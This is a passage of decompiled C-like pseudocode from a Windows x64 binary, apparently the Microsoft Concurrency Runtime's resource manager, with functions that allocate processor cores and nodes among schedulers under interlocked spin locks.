        --*(_DWORD *)(v8 + v5 + 12);
      result = sub_13F151C44((_DWORD *)a2, v8 + *(_QWORD *)(a2 + 32), i, a5);
      if ( !--a4 )
        break;
    }
  }
  return result;
}

//----- (000000013F144828) ----------------------------------------------------
char *__fastcall sub_13F144828(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, unsigned int a5)
{
  unsigned __int64 v6; // r11
  __int64 v7; // r10
  unsigned int v8; // er9
  unsigned int v9; // er12
  unsigned int v10; // er15
  unsigned int v11; // er14
  unsigned int v12; // er13
  __int64 v13; // rbp
  unsigned int v14; // er14
  __int64 v15; // rsi
  char v16; // cl
  char v17; // bl
  char v18; // si
  char *result; // rax
  unsigned __int64 v20; // [rsp+30h] [rbp-48h]
  __int64 v21; // [rsp+38h] [rbp-40h]
  __int64 v23; // [rsp+88h] [rbp+10h]

  v21 = *(_QWORD *)(a2 + 16);
  v6 = (unsigned __int64)a4 << 6;
  v7 = v6 + *(_QWORD *)(v21 + 32);
  v20 = v6;
  v23 = v7;
  v8 = *(_DWORD *)(v7 + 52);
  v9 = v8;
  if ( a5 < v8 )
    v9 = a5;
  v10 = a5 - v9;
  if ( a5 - v9 >= *(_DWORD *)(v7 + 40) - v8 )
    v10 = *(_DWORD *)(v7 + 40) - v8;
  v11 = a5 - v10 - v9;
  v12 = v11;
  if ( v11 >= *(_DWORD *)(v7 + 48) - v8 )
    v12 = *(_DWORD *)(v7 + 48) - v8;
  v13 = 0i64;
  v14 = v11 - v12;
  while ( 1 )
  {
    v15 = *(_QWORD *)(v7 + 56) + 72 * v13;
    if ( *(_DWORD *)v15 == 4 && !*(_DWORD *)(v15 + 56) )
      break;
LABEL_30:
    v13 = (unsigned int)(v13 + 1);
  }
  v16 = *(_BYTE *)(v15 + 65);
  v17 = *(_BYTE *)(v15 + 64);
  if ( v16 )
  {
    if ( v17 && v9 )
    {
      --v9;
    }
    else
    {
      if ( !v10 )
        goto LABEL_30;
      --v10;
    }
  }
  else if ( v17 && v12 )
  {
    --v12;
  }
  else
  {
    if ( !v14 )
      goto LABEL_30;
    --v14;
  }
  if ( v17 )
  {
    sub_13F147918(
      a1,
      v7,
      v15,
      v6 + *(_QWORD *)(a1 + 96),
      (_DWORD *)(*(_QWORD *)(v6 + *(_QWORD *)(a1 + 96) + 48) + 48 * v13),
      a2);
    v16 = *(_BYTE *)(v15 + 65);
    v7 = v23;
  }
  v18 = 0;
  if ( v16 )
  {
    v18 = 1;
    if ( v17 )
      --*(_DWORD *)(a2 + 40);
    else
      --*(_DWORD *)(a2 + 44);
  }
  else
  {
    --*(_DWORD *)(a2 + 48);
  }
  sub_13F152CDC(v21, v7, v13);
  result = sub_13F151C44((_DWORD *)a3, *(_QWORD *)(a3 + 32) + v20, v13, v18);
  if ( --a5 )
  {
    v7 = v23;
    v6 = v20;
    goto LABEL_30;
  }
  return result;
}

//----- (000000013F1449FC) ----------------------------------------------------
__int64 __fastcall sub_13F1449FC(__int64 a1)
{
  sub_13F144A14(a1);
  sub_13F1428E4();
  return 0i64;
}

//----- (000000013F144A14) ----------------------------------------------------
__int64 __fastcall sub_13F144A14(__int64 a1)
{
  unsigned int v2; // esi
  __int64 v3; // rbp
  __int64 result; // rax
  __int64 i; // rbx
  int v6; // er14
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // rcx
  unsigned int v10; // ebx

  v2 = 100;
  v3 = sub_13F1426A8(a1) - 500;
  result = *(unsigned int *)(a1 + 44);
  if ( (_DWORD)result != 2 )
  {
    for ( i = a1 + 48; ; i = a1 + 48 )
    {
      v6 = MEMORY[0x76F91980](*(_QWORD *)(a1 + 112), v2, 0i64);
      sub_13F1419D8(i);
      v8 = *(unsigned int *)(a1 + 44);
      if ( (_DWORD)v8 )
      {
        if ( (_DWORD)v8 != 1 )
          goto LABEL_17;
        if ( v6 == 258 )
        {
          sub_13F1444FC(a1, v7);
LABEL_7:
          if ( *(_DWORD *)(a1 + 20) )
            sub_13F1474A8(a1, 0i64);
          goto LABEL_9;
        }
        v10 = sub_13F1426A8(v8) - v3;
        if ( v10 > 0x64 )
        {
          if ( v10 <= 0x82 )
            goto LABEL_7;
          sub_13F143F0C(a1);
LABEL_9:
          LODWORD(v3) = sub_13F1426A8(v9);
          v2 = 100;
          goto LABEL_17;
        }
        if ( *(_DWORD *)(a1 + 20) )
          sub_13F1474A8(a1, 0i64);
        v2 = 100 - v10;
      }
      else
      {
        v2 = sub_13F143F84(a1) ? -1 : 100;
      }
LABEL_17:
      sub_13F141BDC(a1 + 48);
      result = *(unsigned int *)(a1 + 44);
      if ( (_DWORD)result == 2 )
        return result;
    }
  }
  return result;
}
// 13F144A8C: variable 'v7' is possibly undefined
// 13F144AA1: variable 'v9' is possibly undefined
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);

//----- (000000013F144B2C) ----------------------------------------------------
__int64 __fastcall sub_13F144B2C(__int64 a1, unsigned int *a2, unsigned int *a3, __int64 a4, int a5, unsigned int a6)
{
  __int64 v6; // rax
  char v7; // r14
  unsigned int *v9; // rdi
  unsigned int *v10; // rbx
  __int64 v11; // r11
  __int64 v12; // r10
  __int64 v13; // r12
  __int64 v14; // r8
  unsigned int v15; // ebp
  unsigned int v16; // ecx
  unsigned int v17; // er13
  unsigned int v18; // er9
  unsigned int *v19; // rbp
  unsigned __int64 v20; // rdx
  unsigned int v21; // er15
  unsigned int v22; // er10
  unsigned int v23; // ecx
  unsigned int v24; // eax
  unsigned int v25; // er12
  unsigned int v26; // ebx
  __int64 v27; // rdi
  __int64 v28; // rbp
  __int64 v29; // rbp
  int v30; // er13
  unsigned int v31; // er13
  unsigned int v32; // eax
  unsigned int v33; // ecx
  unsigned int v34; // ecx
  unsigned int v35; // ecx
  unsigned int v36; // eax
  unsigned int v37; // eax
  bool v38; // zf
  unsigned int v39; // eax
  __int64 v40; // r15
  unsigned int v41; // edi
  __int64 v42; // r13
  unsigned int v43; // ebx
  unsigned int v44; // edx
  unsigned int v45; // eax
  unsigned int *v46; // rax
  __int64 v47; // r15
  unsigned int v48; // ebx
  __int64 v49; // r10
  __int64 v50; // rcx
  _DWORD *v51; // rdx
  int v52; // er8
  unsigned int v53; // er8
  unsigned int v54; // ecx
  unsigned int v55; // eax
  unsigned int v56; // edx
  unsigned int v57; // eax
  __int64 v58; // rdx
  int v59; // ecx
  unsigned int v61; // [rsp+30h] [rbp-78h]
  unsigned int v62; // [rsp+34h] [rbp-74h]
  __int64 v63; // [rsp+40h] [rbp-68h]
  __int64 v64; // [rsp+48h] [rbp-60h]
  unsigned int *v65; // [rsp+50h] [rbp-58h]
  __int64 v66; // [rsp+58h] [rbp-50h]
  int v70; // [rsp+C8h] [rbp+20h]
  __int64 v71; // [rsp+C8h] [rbp+20h]
  char v72; // [rsp+D0h] [rbp+28h]

  v6 = *(_QWORD *)(a4 + 16);
  v7 = 1;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v12 = *(_QWORD *)(v6 + 32);
  v13 = *(_QWORD *)(v6 + 40);
  v63 = v12;
  v66 = v13;
  if ( a5 == 1 )
    v72 = 0;
  else
    v72 = *(_BYTE *)(a4 + 32);
  v14 = *(unsigned int *)(a4 + 44);
  v15 = 0;
  v16 = -1;
  v17 = 0;
  v70 = -1;
  v18 = 0;
  v62 = 0;
  if ( (unsigned int)v14 >= *(_DWORD *)(v11 + 28) )
    goto LABEL_82;
  v19 = (unsigned int *)(v13 + 4 * v14);
  v65 = v19;
  do
  {
    v20 = (unsigned __int64)*v19 << 6;
    if ( *(_DWORD *)(v20 + v12 + 36) )
      goto LABEL_38;
    v21 = *(_DWORD *)(a4 + 4);
    if ( v21 >= *(_DWORD *)(v20 + v12 + 8) )
      v21 = *(_DWORD *)(v20 + v12 + 8);
    v22 = 0;
    v61 = 0;
    if ( *v10 )
    {
      v23 = *(_DWORD *)(v20 + *(_QWORD *)(v11 + 96) + 12);
      if ( v23 )
      {
        v24 = *v10;
        v22 = 1;
        if ( *v10 >= v23 )
          v24 = *(_DWORD *)(v20 + *(_QWORD *)(v11 + 96) + 12);
        v61 = v24;
      }
    }
    v25 = *v9;
    v26 = 0;
    if ( *v9 )
    {
      v27 = 0i64;
      if ( a6 )
      {
        do
        {
          if ( v26 >= v25 )
            break;
          v64 = *(_QWORD *)(*(_QWORD *)(v11 + 128) + 8 * v27);
          v28 = *(_QWORD *)(v64 + 16);
          if ( *(_DWORD *)(v28 + 208) > *(_DWORD *)(v64 + 36) )
          {
            v29 = *(_QWORD *)(v28 + 32);
            v30 = *(_DWORD *)(v20 + v29 + 36) - *(_DWORD *)(v20 + v29 + 44);
            if ( v30 )
            {
              v31 = v30 - *(_DWORD *)(v20 + v29 + 40);
              v32 = *(_DWORD *)(v20 + v29 + 52);
              v33 = *(_DWORD *)(v20 + v29 + 40) - v32;
              if ( v33 >= *(_DWORD *)(v64 + 44) )
                v33 = *(_DWORD *)(v64 + 44);
              if ( v32 >= *(_DWORD *)(v64 + 40) )
                v32 = *(_DWORD *)(v64 + 40);
              v34 = v32 + v33;
              if ( v31 >= *(_DWORD *)(v64 + 48) )
                v31 = *(_DWORD *)(v64 + 48);
              v35 = v31 + v34;
              if ( v35 )
              {
                v36 = v25 - v26;
                if ( v25 - v26 >= v35 )
                  v36 = v35;
                v26 += v36;
                ++v22;
              }
            }
          }
          v27 = (unsigned int)(v27 + 1);
        }
        while ( (unsigned int)v27 < a6 );
        v17 = v62;
        v19 = v65;
      }
      v9 = a3;
    }
    v37 = v26 + v61;
    if ( v72 )
    {
      v38 = v37 == v21;
    }
    else
    {
      if ( v18 < v21 && v37 > v18 )
      {
LABEL_53:
        v16 = v14;
        v62 = v22;
        v70 = v14;
        v18 = v26 + v61;
        v17 = v22;
        goto LABEL_37;
      }
      v38 = v37 == v18;
    }
    if ( v38 && v22 > v17 )
      goto LABEL_53;
    v16 = v70;
LABEL_37:
    v10 = a2;
    v12 = v63;
LABEL_38:
    ++v19;
    LODWORD(v14) = v14 + 1;
    v65 = v19;
  }
  while ( (unsigned int)v14 < *(_DWORD *)(v11 + 28) );
  v15 = 0;
  if ( v16 == -1 )
  {
LABEL_82:
    v7 = 0;
    goto LABEL_83;
  }
  v39 = *(_DWORD *)(a4 + 4);
  v15 = v39;
  v40 = v16;
  v71 = v16;
  if ( v39 >= v18 )
    v15 = v18;
  v41 = v15;
  v42 = *(unsigned int *)(v66 + 4i64 * v16);
  *(_DWORD *)(a4 + 4) = v39 - v15;
  v43 = *v10;
  if ( v43 )
  {
    v44 = *(_DWORD *)(((unsigned __int64)(unsigned int)v42 << 6) + *(_QWORD *)(v11 + 96) + 12);
    if ( v44 )
    {
      v45 = v43;
      if ( v43 >= v44 )
        v45 = *(_DWORD *)(((unsigned __int64)(unsigned int)v42 << 6) + *(_QWORD *)(v11 + 96) + 12);
      if ( v45 >= v15 )
      {
        v43 = v15;
      }
      else if ( v43 >= v44 )
      {
        v43 = *(_DWORD *)(((unsigned __int64)(unsigned int)v42 << 6) + *(_QWORD *)(v11 + 96) + 12);
      }
      sub_13F14477C(v11, *(_QWORD *)(a4 + 16), v42, v43, 0);
      v11 = a1;
      *a2 -= v43;
      v41 = v15 - v43;
    }
  }
  if ( v41 )
  {
    v46 = a3;
    if ( *a3 )
    {
      v47 = 0i64;
      do
      {
        if ( (unsigned int)v47 >= a6 )
          break;
        v48 = *v46;
        if ( !*v46 )
          break;
        v49 = *(_QWORD *)(*(_QWORD *)(v11 + 128) + 8 * v47);
        v50 = *(_QWORD *)(v49 + 16);
        if ( *(_DWORD *)(v50 + 208) <= *(_DWORD *)(v49 + 36) )
          goto LABEL_78;
        v51 = (_DWORD *)(*(_QWORD *)(v50 + 32) + (v42 << 6));
        v52 = v51[9] - v51[11];
        if ( !v52 )
          goto LABEL_78;
        v53 = v52 - v51[10];
        v54 = v51[13];
        v55 = v51[10] - v54;
        if ( v54 >= *(_DWORD *)(v49 + 40) )
          v54 = *(_DWORD *)(v49 + 40);
        if ( v55 >= *(_DWORD *)(v49 + 44) )
          v55 = *(_DWORD *)(v49 + 44);
        if ( v53 >= *(_DWORD *)(v49 + 48) )
          v53 = *(_DWORD *)(v49 + 48);
        v56 = v53 + v55 + v54;
        if ( v56 )
        {
          v57 = v48;
          if ( v48 >= v56 )
            v57 = v56;
          if ( v57 >= v41 )
          {
            v48 = v41;
          }
          else if ( v48 >= v56 )
          {
            v48 = v56;
          }
          sub_13F144828(v11, *(_QWORD *)(*(_QWORD *)(v11 + 128) + 8 * v47), *(_QWORD *)(a4 + 16), v42, v48);
          v46 = a3;
          v11 = a1;
          *a3 -= v48;
          v41 -= v48;
        }
        else
        {
LABEL_78:
          v46 = a3;
        }
        v47 = (unsigned int)(v47 + 1);
      }
      while ( v41 );
      v40 = v71;
    }
  }
  v58 = *(unsigned int *)(a4 + 44);
  v59 = *(_DWORD *)(v66 + 4 * v58);
  *(_DWORD *)(v66 + 4 * v58) = *(_DWORD *)(v66 + 4 * v40);
  *(_DWORD *)(v66 + 4 * v40) = v59;
  ++*(_DWORD *)(a4 + 44);
LABEL_83:
  *(_BYTE *)(a4 + 32) = v7;
  return v15;
}

//----- (000000013F144EF4) ----------------------------------------------------
__int64 __fastcall sub_13F144EF4(__int64 a1, unsigned int a2, __int64 a3, int a4)
{
  __int64 v4; // r14
  unsigned int v5; // edi
  char v9; // bp
  __int64 v10; // r15
  bool v11; // zf
  char v12; // r9
  unsigned int v13; // ecx
  unsigned int v14; // er11
  unsigned int v15; // er10
  __int64 v16; // r14
  unsigned __int64 v17; // r8
  unsigned int v18; // ebx
  unsigned int v19; // edx
  unsigned int v20; // eax
  __int64 v21; // rbx
  __int64 v22; // rdx
  int v23; // ecx

  v4 = *(_QWORD *)(a3 + 16);
  v5 = 0;
  v9 = 1;
  v10 = *(_QWORD *)(v4 + 40);
  v11 = a4 == 1;
  v12 = 0;
  if ( !v11 )
    v12 = *(_BYTE *)(a3 + 32);
  v13 = *(_DWORD *)(a3 + 44);
  v14 = -1;
  v15 = 0;
  if ( v13 >= *(_DWORD *)(a1 + 28) )
    goto LABEL_21;
  v16 = *(_QWORD *)(v4 + 32);
  do
  {
    v17 = (unsigned __int64)*(unsigned int *)(v10 + 4i64 * v13) << 6;
    if ( *(_DWORD *)(v17 + v16 + 36) )
      goto LABEL_16;
    v18 = *(_DWORD *)(a3 + 4);
    v19 = 0;
    if ( v18 >= *(_DWORD *)(v17 + v16 + 8) )
      v18 = *(_DWORD *)(v17 + v16 + 8);
    v20 = *(_DWORD *)(v17 + *(_QWORD *)(a1 + 96) + 40);
    if ( v20 )
    {
      v19 = *(_DWORD *)(v17 + *(_QWORD *)(a1 + 96) + 40);
      if ( a2 < v20 )
        v19 = a2;
    }
    if ( v12 )
    {
      if ( v19 != v18 )
        goto LABEL_16;
    }
    else if ( v19 <= v15 )
    {
      goto LABEL_16;
    }
    v14 = v13;
    v15 = v19;
    if ( v12 )
      break;
LABEL_16:
    ++v13;
  }
  while ( v13 < *(_DWORD *)(a1 + 28) );
  if ( v14 == -1 )
  {
LABEL_21:
    v9 = 0;
    goto LABEL_22;
  }
  v5 = *(_DWORD *)(a3 + 4);
  v21 = v14;
  if ( v5 >= v15 )
    v5 = v15;
  sub_13F14477C(a1, *(_QWORD *)(a3 + 16), *(_DWORD *)(v10 + 4i64 * v14), v5, 1);
  *(_DWORD *)(a3 + 4) -= v5;
  v22 = *(unsigned int *)(a3 + 44);
  v23 = *(_DWORD *)(v10 + 4 * v22);
  *(_DWORD *)(v10 + 4 * v22) = *(_DWORD *)(v10 + 4 * v21);
  *(_DWORD *)(v10 + 4 * v21) = v23;
  ++*(_DWORD *)(a3 + 44);
LABEL_22:
  *(_BYTE *)(a3 + 32) = v9;
  return v5;
}

//----- (000000013F145018) ----------------------------------------------------
char __fastcall sub_13F145018(__int64 a1, _DWORD *a2, _DWORD *a3, __int64 a4, unsigned int a5)
{
  char v8; // si
  __int64 v9; // rdx
  unsigned int v10; // er10
  unsigned __int64 v11; // rdi
  unsigned int v12; // er14
  __int64 v13; // r15
  __int64 v14; // rdx
  __int64 v15; // rcx
  __int64 v16; // rcx
  unsigned int v18; // [rsp+68h] [rbp+10h]
  __int64 v20; // [rsp+78h] [rbp+20h]

  v8 = 0;
  v9 = *(_QWORD *)(a4 + 16);
  v20 = *(_QWORD *)(v9 + 32);
  v10 = *(_DWORD *)(*(_QWORD *)(v9 + 40) + 4i64 * *(unsigned int *)(a4 + 44));
  v18 = v10;
  v11 = (unsigned __int64)v10 << 6;
  if ( *a2 && *(_DWORD *)(*(_QWORD *)(a1 + 96) + v11 + 12) )
  {
    v8 = 1;
    sub_13F14477C(a1, v9, v10, 1, 0);
    --*a2;
  }
  else
  {
    if ( !*a3 || (v12 = 0, !a5) )
    {
LABEL_20:
      ++*(_DWORD *)(a4 + 44);
      return v8;
    }
    v13 = 0i64;
    while ( !v8 )
    {
      v14 = *(_QWORD *)(v13 + *(_QWORD *)(a1 + 128));
      v15 = *(_QWORD *)(v14 + 16);
      if ( *(_DWORD *)(v15 + 208) > *(_DWORD *)(v14 + 36) )
      {
        if ( (v16 = *(_QWORD *)(v15 + 32), *(_DWORD *)(v11 + v16 + 52))
          || *(_DWORD *)(v11 + v16 + 40) && *(_DWORD *)(v14 + 44)
          || *(_DWORD *)(v11 + v16 + 36) != *(_DWORD *)(v11 + v16 + 44) && *(_DWORD *)(v14 + 48) )
        {
          v8 = 1;
          sub_13F144828(a1, v14, *(_QWORD *)(a4 + 16), v10, 1u);
          v10 = v18;
          --*a3;
        }
      }
      ++v12;
      v13 += 8i64;
      if ( v12 >= a5 )
      {
        if ( !v8 )
          goto LABEL_20;
        break;
      }
    }
  }
  if ( *(_DWORD *)(v11 + v20 + 36) == *(_DWORD *)(v11 + v20 + 8) )
    ++*(_DWORD *)(a4 + 44);
  --*(_DWORD *)(a4 + 4);
  return v8;
}

//----- (000000013F145170) ----------------------------------------------------
__int64 __fastcall sub_13F145170(__int64 a1)
{
  _BYTE *v1; // rcx
  __int64 result; // rax
  char v3; // [rsp+38h] [rbp+10h] BYREF

  v1 = *(_BYTE **)(a1 + 224);
  if ( *v1 == 1 )
    return MEMORY[0x76F729F0](v1, 1i64, 2i64, &v3);
  return result;
}
// 13F1C5D90: using guessed type int dword_13F1C5D90;

//----- (000000013F1451AC) ----------------------------------------------------
__int64 __fastcall sub_13F1451AC(__int64 a1)
{
  return *(unsigned int *)(a1 + 28);
}

//----- (000000013F1451B0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1451B0()
{
  __int64 result; // rax
  char v1[8]; // [rsp+28h] [rbp-20h] BYREF
  int v2; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v3)(); // [rsp+38h] [rbp-10h]

  if ( _InterlockedExchange(&dword_13F1C5DD8, 1) )
  {
    v2 = 0;
    v3 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v1);
    while ( _InterlockedExchange(&dword_13F1C5DD8, 1) );
  }
  sub_13F145B08();
  result = 0i64;
  dword_13F1C5DD8 = 0;
  return result;
}
// 13F145223: write access to const memory at 13F1C5DD8 has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F1C5D80: using guessed type int dword_13F1C5D80;
// 13F1C5DD8: using guessed type int dword_13F1C5DD8;
// 13F1451B0: using guessed type char var_20[8];

//----- (000000013F145234) ----------------------------------------------------
__int64 __fastcall sub_13F145234(__int64 a1, _DWORD *a2)
{
  unsigned int i; // edx
  unsigned __int64 v5; // rax
  unsigned int v6; // er10
  __int64 v7; // r8
  int v8; // eax
  unsigned __int64 v9; // rcx
  unsigned int v10; // er10
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF
  unsigned __int16 v13; // [rsp+60h] [rbp+18h] BYREF
  unsigned __int8 v14; // [rsp+62h] [rbp+1Ah]

  if ( (int)sub_13F147980() < 4 )
  {
    if ( (unsigned int)sub_13F147980() != 2 && (unsigned int)sub_13F147980() != 3 )
    {
      sub_13F142E78(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
    }
    v8 = sub_13F10AA44();
    for ( i = 0; ; ++i )
    {
      v9 = *(_QWORD *)(a1 + 96) + ((unsigned __int64)i << 6);
      if ( ((1i64 << v8) & *(_QWORD *)v9) != 0 )
      {
        v10 = *(_DWORD *)(v9 + 8);
        v7 = 0i64;
        if ( v10 )
          break;
      }
LABEL_17:
      ;
    }
    while ( *(unsigned __int8 *)(*(_QWORD *)(v9 + 48) + 48 * v7 + 8) != v8 )
    {
      v7 = (unsigned int)(v7 + 1);
      if ( (unsigned int)v7 >= v10 )
        goto LABEL_17;
    }
  }
  else
  {
    sub_13F1423B0((__int64)&v13);
    for ( i = 0; ; ++i )
    {
      v5 = *(_QWORD *)(a1 + 96) + ((unsigned __int64)i << 6);
      if ( *(_DWORD *)(v5 + 16) == v13 && ((1i64 << v14) & *(_QWORD *)v5) != 0 )
      {
        v6 = *(_DWORD *)(v5 + 8);
        v7 = 0i64;
        if ( v6 )
          break;
      }
LABEL_8:
      ;
    }
    while ( *(unsigned __int8 *)(*(_QWORD *)(v5 + 48) + 48 * v7 + 8) != v14 )
    {
      v7 = (unsigned int)(v7 + 1);
      if ( (unsigned int)v7 >= v6 )
        goto LABEL_8;
    }
  }
  if ( a2 )
    *a2 = v7;
  return i;
}
// 13F1C5D90: using guessed type int dword_13F1C5D90;
// 13F145234: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F145374) ----------------------------------------------------
__int64 __fastcall sub_13F145374(__int64 a1)
{
  return *(unsigned int *)(*(_QWORD *)(a1 + 8) + 8i64);
}

//----- (000000013F14537C) ----------------------------------------------------
__int64 __fastcall sub_13F14537C(__int64 a1)
{
  return *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 48i64) + 40i64);
}

//----- (000000013F14538C) ----------------------------------------------------
__int64 __fastcall sub_13F14538C(__int64 a1)
{
  return *(_QWORD *)(*(_QWORD *)(a1 + 96) + 56i64);
}

//----- (000000013F145398) ----------------------------------------------------
__int64 __fastcall sub_13F145398(__int64 a1)
{
  return *(unsigned int *)(*(_QWORD *)(a1 + 8) + 4i64);
}

//----- (000000013F1453A0) ----------------------------------------------------
__int64 __fastcall sub_13F1453A0(__int64 a1)
{
  return *(unsigned int *)(*(_QWORD *)(a1 + 8) + 20i64);
}

//----- (000000013F1453A8) ----------------------------------------------------
__int64 __fastcall sub_13F1453A8(__int64 a1)
{
  __int64 v1; // rdx
  __int64 v2; // r8
  __int64 v3; // rcx
  __int64 v4; // r9
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // rdx
  __int64 v7; // rcx

  v1 = *(_QWORD *)(a1 + 8);
  v2 = 0i64;
  v3 = *(_QWORD *)(v1 + 16);
  v4 = *(_QWORD *)(v3 + 48);
  v5 = (__int64)((unsigned __int128)((v1 - v4) * (__int128)0x2AAAAAAAAAAAAAABi64) >> 64) >> 3;
  v6 = (v5 >> 63) + (unsigned int)v5 + 1;
  if ( (unsigned int)v6 >= *(_DWORD *)(v3 + 8) )
    v7 = 0i64;
  else
    v7 = v4 + 48 * v6;
  if ( v7 )
    return *(_QWORD *)(v7 + 40);
  return v2;
}

//----- (000000013F1453FC) ----------------------------------------------------
__int64 __fastcall sub_13F1453FC(__int64 a1)
{
  __int64 v1; // rdx
  __int64 v2; // rcx
  __int64 v3; // rax
  __int64 v4; // r8
  unsigned int v5; // edx
  __int64 v6; // rax

  v1 = *(_QWORD *)(a1 + 8);
  v2 = 0i64;
  v3 = *(_QWORD *)(v1 + 32);
  v4 = *(_QWORD *)(v3 + 96);
  v5 = ((v1 - v4) >> 6) + 1;
  if ( v5 >= *(_DWORD *)(v3 + 28) )
    v6 = 0i64;
  else
    v6 = v4 + ((unsigned __int64)v5 << 6);
  if ( v6 )
    return *(_QWORD *)(v6 + 56);
  return v2;
}

//----- (000000013F145434) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F145434()
{
  __int64 result; // rax
  char v1[8]; // [rsp+28h] [rbp-20h] BYREF
  int v2; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v3)(); // [rsp+38h] [rbp-10h]

  if ( _InterlockedExchange(&dword_13F1C5DD8, 1) )
  {
    v2 = 0;
    v3 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v1);
    while ( _InterlockedExchange(&dword_13F1C5DD8, 1) );
  }
  sub_13F145B08();
  result = 0i64;
  dword_13F1C5DD8 = 0;
  return result;
}
// 13F1454A7: write access to const memory at 13F1C5DD8 has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F145434: using guessed type __int64 __fastcall sub_13F145434();
// 13F1C5D88: using guessed type int dword_13F1C5D88;
// 13F1C5DD8: using guessed type int dword_13F1C5DD8;
// 13F145434: using guessed type char var_20[8];

//----- (000000013F1454B8) ----------------------------------------------------
__int64 __fastcall sub_13F1454B8(__int64 a1)
{
  return *(unsigned int *)(*(_QWORD *)(a1 + 8) + 24i64);
}

//----- (000000013F1454D8) ----------------------------------------------------
__int64 sub_13F1454D8()
{
  return (unsigned int)_InterlockedIncrement(&dword_13F1B71C8);
}
// 13F1B71C8: using guessed type int dword_13F1B71C8;

//----- (000000013F1454E8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1454E8()
{
  __int64 result; // rax

  result = sub_13F1423D4((unsigned int *)&dword_13F1C5D94);
  qword_13F1C5D98 = result;
  return result;
}
// 13F14550F: write access to const memory at 13F1C5D98 has been detected
// 13F1C5D94: using guessed type int dword_13F1C5D94;
// 13F1C5D98: using guessed type __int64 qword_13F1C5D98;

//----- (000000013F14551C) ----------------------------------------------------
__int64 __fastcall sub_13F14551C(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  unsigned int i; // esi
  unsigned __int64 v8; // r14
  __int64 v9; // rbx
  unsigned int v10; // edi
  __int64 v11; // rbp
  _DWORD *v12; // rdx
  int v13; // er8
  __int64 v14; // [rsp+60h] [rbp+8h]

  result = *(_QWORD *)(a2 + 32);
  v14 = result;
  for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
  {
    v8 = (unsigned __int64)i << 6;
    v9 = v8 + result;
    if ( *(_DWORD *)(v8 + result + 40) )
    {
      v10 = 0;
      if ( *(_DWORD *)(v9 + 8) )
      {
        do
        {
          v11 = *(_QWORD *)(v9 + 56) + 72i64 * v10;
          if ( *(_DWORD *)v11 == 4 && *(_BYTE *)(v11 + 65) )
          {
            v12 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 96) + v8 + 48) + 48i64 * v10);
            v13 = v12[6];
            if ( v13 == 1 )
            {
              sub_13F152F78(a2, v9, v10);
              if ( *(_BYTE *)(v11 + 64) )
              {
                --*(_DWORD *)(v9 + 52);
                --*(_DWORD *)(a3 + 28);
              }
            }
            else if ( v13 - v12[9] > (unsigned int)(*(_BYTE *)(v11 + 64) == 0) )
            {
              v12[6] = v13 - 1;
              if ( *(_BYTE *)(v11 + 64) )
                sub_13F147918(a1, v9, v11, v8 + *(_QWORD *)(a1 + 96), v12, a3);
              sub_13F152CDC(a2, v9, v10);
            }
          }
          ++v10;
        }
        while ( v10 < *(_DWORD *)(v9 + 8) );
        result = v14;
      }
    }
  }
  return result;
}

//----- (000000013F145668) ----------------------------------------------------
__int64 __fastcall sub_13F145668(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // edi
  unsigned int v5; // er11
  unsigned int v7; // er10
  unsigned int v8; // er9
  int v9; // ecx
  unsigned int v10; // ebx
  __int64 result; // rax
  __int64 v12; // r12
  unsigned int v13; // ebp
  unsigned __int64 v14; // r14
  __int64 v15; // rdi
  __int64 v16; // rsi
  __int64 v17; // r8
  _DWORD *v18; // rcx
  __int64 v19; // [rsp+78h] [rbp+10h]

  v3 = *(_DWORD *)(a2 + 232);
  v5 = *(_DWORD *)(a2 + 180);
  v7 = *(_DWORD *)(a2 + 220) - v3;
  v8 = v7;
  if ( v7 <= v5 )
    v8 = *(_DWORD *)(a2 + 180);
  v9 = *(_DWORD *)(a2 + 208) - *(_DWORD *)(a2 + 216);
  v10 = *(_DWORD *)(a2 + 208) - *(_DWORD *)(a3 + 36) - *(_DWORD *)(a3 + 28);
  result = v9 - (v3 + v8);
  if ( v10 >= (unsigned int)result )
  {
    if ( v7 <= v5 )
      v7 = *(_DWORD *)(a2 + 180);
    v10 = v9 - (v3 + v7);
  }
  v12 = *(_QWORD *)(a2 + 32);
  v13 = 0;
  v19 = v12;
  while ( v10 && v13 < *(_DWORD *)(a1 + 28) )
  {
    v14 = (unsigned __int64)v13 << 6;
    v15 = v14 + v12;
    result = *(unsigned int *)(v14 + v12 + 36);
    if ( (_DWORD)result != *(_DWORD *)(v14 + v12 + 44) )
    {
      v16 = 0i64;
      do
      {
        if ( (unsigned int)v16 >= *(_DWORD *)(v15 + 8) )
          break;
        result = *(_QWORD *)(v15 + 56);
        v17 = result + 72 * v16;
        if ( *(_DWORD *)v17 == 4 && !*(_DWORD *)(v17 + 56) && !*(_BYTE *)(v17 + 65) )
        {
          v18 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 96) + v14 + 48) + 48 * v16);
          result = (unsigned int)v18[6];
          if ( (unsigned int)result > 1 )
          {
            v18[6] = result - 1;
            if ( *(_BYTE *)(v17 + 64) )
